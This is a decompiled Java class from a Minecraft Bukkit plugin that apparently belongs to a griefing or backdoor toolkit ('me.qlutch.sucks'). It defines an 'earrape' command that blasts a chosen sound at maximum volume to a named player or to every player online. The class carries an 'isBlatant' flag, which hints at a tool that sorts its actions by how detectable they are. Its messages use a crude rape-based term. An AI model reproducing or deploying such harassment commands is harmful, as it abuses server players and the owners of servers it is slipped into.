/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Sound
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

public class EarrapeCommand
extends Command {
    private Sound removeConnectionThread;

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length == 3) {
            try {
                this.removeConnectionThread = Sound.valueOf((String)args[1].toUpperCase());
            }
            catch (IllegalArgumentException e2) {
                p2.sendMessage(Settings.PREFIX("The sound " + Settings.RED + args[1] + Settings.WHITE + " was not found!"));
                return;
            }
            if (args[2].equals("*")) {
                for (Player a2 : Bukkit.getOnlinePlayers()) {
                    a2.playSound(a2.getLocation(), this.removeConnectionThread, 20.0f, 10.0f);
                }
                p2.sendMessage(Settings.PREFIX("Everyone has been ear raped!"));
            } else {
                Player target = Bukkit.getServer().getPlayer(args[2]);
                if (target == null) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[2] + Settings.WHITE + " is not online."));
                } else {
                    target.playSound(target.getLocation(), this.removeConnectionThread, 20.0f, 10.0f);
                    p2.sendMessage(Settings.PREFIX(target.getName() + " has been ear raped!"));
                }
            }
        } else {
            p2.sendMessage(Settings.USAGE("earrape <sound> <player | *>"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

